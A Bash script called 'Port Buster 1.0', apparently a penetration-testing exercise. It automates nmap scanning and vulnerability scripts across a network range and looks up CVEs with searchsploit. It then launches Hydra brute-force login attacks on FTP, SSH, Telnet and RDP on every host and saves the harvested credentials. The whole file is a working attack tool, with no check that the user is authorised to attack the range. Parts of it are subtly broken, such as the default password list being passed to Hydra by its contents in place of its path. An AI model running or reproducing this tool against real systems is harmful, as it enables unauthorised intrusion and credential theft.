#!/bin/bash




red="\e[31m"				#Setting up color variables to colorize the script and the figlet
green="\e[32m"
yellow="\e[33m"
blue="\e[34m"

endcolor="\e[0m"			#End of color variable effect

ts=$(date +%a_%b.%d_%Y_%H:%M:%S)	#Setting up a date & time variable for folder and file documentation

printf $yellow
figlet Port Buster 1.0			#Yellow script headline
printf $endcolor


function validrange(){			#Function does an nmap scan; throws errors into .err and everything else into .scan. If .err contains data, the range is invalid. Otherwise, get prompt that the range is valid. Hidden .err is deleted once the authentication is complete
cd $folder.$ts
nmap $target  -sL 2> .err 1> .scan
        if [ ! -z "$(cat .err)" ]	#Checks if the's anything inside the .err file. If it contains data, the scan failed, so the network range cannot be valid
                then
                rm .err
		
                echo -e "$red[!] Network range invalid. Please restart the script and try again.$endcolor \n[*] Exiting..."
                exit 1
                else
                rm .err
		
                echo -e "\n$green[!] Network range is valid $endcolor\n"
        fi
cd ..
}


function privileges (){			#Function examines root privliges by testing the user's group. If the group is not 0 - User gets a prompt and script terminates. If user is part of group 0 - The script continues as normal with no prompt
if [[ $(id -u) -ne 0 ]]; then
                echo -e "$red[!] WARNING!!! \n[!] This script must run with root privileges. \n[*] Please restart the script under root. \n[*] Terminating script... $endcolor"
                exit 1
fi



}

privileges


function basic (){			#If the uses wishes to perform a basic scan, function does an nmap scan on the network range and saves the results ito the user's specified folder. Gives prompt for every host scanned
cd $folder.$ts
for ip in $(cat .scan | awk '{print $NF}' | grep ^[0-9])
do
	
	echo -e "$yellow[*] Scannning $ip... $endcolor"
	nmap -sS -sU -sV $ip -oN $ip -oX ./HTML_Reports/$ip.xml > /dev/null	 	#Saving a host ip file in the main directory, and an xml file into the HTML)Reports subdirectory
	xsltproc ./HTML_Reports/$ip.xml > ./HTML_Reports/$ip.html		#Converting the xml results into html files
	rm ./HTML_Reports/$ip.xml						#Removing the xml files

	

done

sleep 2

if [ ! -z "$(cat * 2> /dev/null | grep '21/tcp\|22/tcp\|23/tcp\|3389/tcp' )" ]               #Testing whether or not any of the scanned hosts contain open tcp,ssh,rdp o>
        then 
        echo -e "\n$green[!] Found open ports of vulnerable services$endcolor\n\n[*] Engaging Brute Force elements..."
        sleep 1
        brute
        

        else 
        echo -e "\n$red[!] No open ports of vulnerable services found\n[*] Scan is concluded$endcolor"
        sleep 1
        conclude

fi


}



function conclude (){			#Function lets the user know it finished with scannning, vulnerability collection and Brute Force attempts. Gives user the option of opening the results

read -p "[?] Scanning for vulnerabilities and credential harvesting is complete. You you like to go over the results? [Y/N] " view
sleep 0.2
case $view in

Y)
read -p "[?] Would you like to view a specific [H]ost, a [V]ulnerability, or gathered [C]redentials? " pick	#Giving the user a choice of which result he'd like to review
	case $pick in
		H)
		read -p "[?] Please enter a host IP to display: " host
		echo -e "$blue[*] Displaying [H]ost results: $endcolor"
		sleep 0.3
		cat $host											#Displaying data in a scanned host ip file slected by the user
		;;
 
		V) 

		read -p "[?] Please choose the IP CVE file you wish to display: " cve
		echo -e "$blue[*] Displaying [V]ulnerability CVE Report: $endcolor\n"
		
		cat ./CVE_Reports/cve_$cve.txt									#Displaying the cve data file selected by the user
		

		sleep 0.3
		
		

		;;

		C)
		echo -e "$blue[*] Displaying [C]redentials gathered: $endcolor\n"
		cat Hydra_Results.txt | grep host					#Displaying only the usernames and passwords gathered by the Brute Force out of the file, while also showing the related host ip and port


		sleep 0.3
		

		;;

		*) echo -e "$red[!] Invalid input. Moving on...$endcolor"
		sleep 0.3
		;;

		esac
		read -p "[?] Would you like to view a different result? [Y/N] " again			#Prompt gives the user the option to look at another result, if he wishes
			case $again in
				Y)
				conclude								#Restarting the function if the user wishes to view a different result
				;;
				
				N)
				echo -e "$blue[!] You chose not to display any other results. Moving on...$endcolor"
				sleep 0.3
				;;

				*)
				echo -e "$red[!] Invalid input. Moving on...$endcolor"
				sleep 0.3
				;;

				esac



;;

N)
echo -e "$blue[!] You chose not to display results. Moving on...$endcolor"
sleep 0.3
;;

*)
echo -e "$red[!] Invalid input. Try again: $endcolor"
sleep 0.3
conclude									#Restarting the function if the input is not one of the 2 given choices

;;
esac

read -p "[?] Would you like to zip the results? [Y/N] " zip			#Prompt asks the suer whether or not they wish to zip the results. After the user gives their response - the script is concluded and the user gets a Good Bye prompt
cd ..
sleep 1
case $zip in
	Y)
	read -p "[?] Please provide a name for the zipped file: " zipfile	#Giving the user an option to choose the zip file name
	echo -e "$yellow[*] Zipping results folder...$endcolor"
	
	zip -r -q $zipfile $folder.$ts
	sleep 1
	echo -e "\n$green[*] Results folder has been successfully zipped as $zipfile $endcolor\n[*] Good Bye!"
	exit 1
	;;
	N)
	echo -e "$blue[!] You have chosen not to zip the folder$endcolor\n"
	sleep 0.3
	echo -e "$green[*] Operations are now officially concluded$endcolor\n[*] Good Bye!"
	exit 1

	;;
	*)
	echo -e "$red[!] Invalid input! Exiting...$endcolor\n"			#If the input is not one of the two choices, the script ends without zipping
	sleep 0.3
	echo -e "[*] GooPd Bye!"
	exit 1
	;;
esac

}




function full (){								#Function does a full scan on the network, including all ports, udp, service version, operating system and vulnerabilities. Vulnerabilities are saved in an output file
cd $folder.$ts
for ip in $(cat .scan | awk '{print $NF}' | grep ^[0-9])
do
	echo -e "$yellow[*] Scanning $ip... $endcolor"

	nmap -sV -p- --script=vuln $ip -oN $ip -oX ./HTML_Reports/$ip.xml > /dev/null   	#Saves the ip result in the main directory, and an xml file into the HTML_Reports subdirectory
        xsltproc ./HTML_Reports/$ip.xml > ./HTML_Reports/$ip.html				#Converts the xml files into html files
	rm ./HTML_Reports/$ip.xml								#Removes the xml files
	
	
	for y in $(cat $ip | grep -i cve | awk -F / '{print $(NF-0)}' | grep ^[CVE] | cut -d - -f 3 | sort | uniq | sort -n | head -n 10) #For loop to test the output for CVE id's in Searchsploit

	do
	
	searchsploit $y >> ./CVE_Reports/cve_$ip.txt						#Getting the proper CVE's and savinng them in a report inside the CVE_Reports subdirectory
	
	sleep 0.2
	done


	sleep 2
done
echo -e "$blue[+] Generating CVE data...$endcolor"
sleep 5




 
if [ ! -z "$(cat * 2> /dev/null | grep '21/tcp\|22/tcp\|23/tcp\|3389/tcp' )" ]               #Testing whether or not any of the scanned hosts contain open >
        then 
        echo -e "\n$green[!] Found open ports of vulnerable services$endcolor\n\n[*] Engaging Brute Force elements..."
        sleep 1
        brute
        

        else 
        echo -e "\n$red[!] No open ports of vulnerable services found\n[*] Scan is concluded$endcolor"
        sleep 1 
        conclude

fi



}

function brute (){				#Function attempts a Brute Force attack on the target range. Asks the user for a user file, and then gives him the choice between John's password list, and a list provided by the user. Runs attack on the entire range and saves found passwords in a file



read -p "[?] Please enter a user list for the attack to use: " users
	if [ ! -f $users ]			#Tests to see whether there's actually a file in the path. If there is no file, the user gets a prompt and the function restarts. Otherwise, the user gets a prompt letting him know there is a file there
	then
	echo -e "$red[!] path does not contain a file! Please provide a valid list$endcolor"
	sleep 0.5
	brute
	else
	echo -e "$green[!] Path contains a file $endcolor"
	sleep 0.3
	fi
sleep 0.3
echo -e "$blue[*] Hydra is set to use John the Ripper's native password list as a default$endcolor"
sleep 0.3
read -p "[?] Would you like to give it a different list? [Y/N] " list			#Case function to let the user choose between the native password list and their own list
sleep 0.3
case $list in

Y)
echo -e "$blue[*] You have chosen to use your own password list$endcolor"
sleep 0.3
read -p "[?] Please enter a specific password list to use: " passwords
        if [ ! -f $passwords ]			#Tests whether or not a file exists in the path, same as with the user list
        then
        echo -e "$red[!] path does not contain a file! Please provide a valid list$endcolor"
	sleep 0.5
        brute
        else 
        echo -e "$green[!] Path contains a file$endcolor\n"
	sleep 0.5
	echo -e "$yellow[*] Commencing Brute Force attack...$endcolor\n"
	sleep 1
        fi


for x in $(ls)
	do
	if [ -f $x ]			#Since the filename is also an ip address, as long as a file is found, the Brute Force attack will use the filename as a target
	then
	echo -e "$red[!] Attempting Brute Force attack on $x... $endcolor "
	hydra -L $users -P $passwords $x ftp -o Hydra_Results.txt > /dev/null 2>> .err		#Runnig a Brute Force attack on all 4 compromised services, throwing the screen output into /dev/null, and the errors into .err (to be deleted later)
	hydra -L $users -P $passwords $x rdp -o Hydra_Results.txt > /dev/null 2>> .err
	hydra -L $users -P $passwords $x ssh -o Hydra_Results.txt > /dev/null 2>> .err
	hydra -L $users -P $passwords $x telnet -o Hydra_Results.txt > /dev/null 2>> .err
	rm .err				#Deleting the error file, as it serves no more use
	sleep 0.5
	fi
	done
	
echo -e "\n$green[*] Brute Force attack concluded. Results were saved in Hydra_Results.txt$endcolor\n"
sleep 1
conclude
;;
N)
echo -e "$blue[!] You have chosen to use Hydra's default list$endcolor\n"
hydralist=$(cat /usr/share/john/password.lst)
for x in $(ls)
        do
	if [ -f $x ]								#Same concept as with the user-provided password Brute Force attack
        then
        echo -e "$red[!] Attempting Brute Force attack on $x... $endcolor "
        hydra -L $users -P $hydralist $x ftp -o Hydra_Results.txt > /dev/null 2>> .err
	hydra -L $users -P $hydralist $x rdp -o Hydra_Results.txt > /dev/null 2>> .err
        hydra -L $users -P $hydralist $x ssh -o Hydra_Results.txt > /dev/null 2>> .err
	hydra -L $users -P $hydralist $x telnet -o Hydra_Results.txt > /dev/null 2>> .err
	rm .err
	sleep 0.5
	fi
	done
echo -e "\n$green[*] Brute Force attack concluded. Results were saved in Hydra_Results.txt$endcolor\n"
sleep 1
conclude

;;
*)
echo -e "[!] Invalid input. Please choose between [Y/N].\n"	#In case of an invalid input, brute function gets recalled
sleep 0.3
brute
;;
esac

rm .scan
}



read -p "[?] Please set the name of the output folder: " folder		#Prompt asks the user for an output folder name. It is then created
mkdir -p $folder.$ts/CVE_Reports > /dev/null				#Also creates a subfolder for the CVE reports
mkdir $folder.$ts/HTML_Reports	> /dev/null				#Creates an additional folder for HTML reports
sleep 0.3

read -p "[?] Please select whether you'd like to perform a [B]asic or a [F]ull scan: " scan		#Prompt asks the user for the type of scan they wish to perform (basic or full)
sleep 0.3
case $scan in
B)
echo -e "$blue[*] [B]asic scan was selected $endcolor"
sleep 0.3
read -p "[?] Please enter a network as a scanning target: " target					#Prompt asks the user for the scanning range. User can give a single host, or a full range. Script then validates the input via the validrange function
sleep 0.3
validrange 

echo -e "[*] Running scan on given IP range...\n"
sleep 0.3
basic



;;

F)
echo -e "$blue[*] [F]ull scan was selected $endcolor "
sleep 0.3
read -p "[?] Please enter a network as a scanning target: " target					#Same concept as with the basic scanning range prompt
sleep 0.3
validrange

echo -e "[*] Running scan on given IP range...\n"
sleep 0.3
full


;;
*)
echo -e "$red[!]Invalid input. Please restart the script and choose a correct input\n[*] Exiting...$endcolor"		#In case of an invalid input, the script terminates, and the user needs to restart it
exit 1
;;
esac


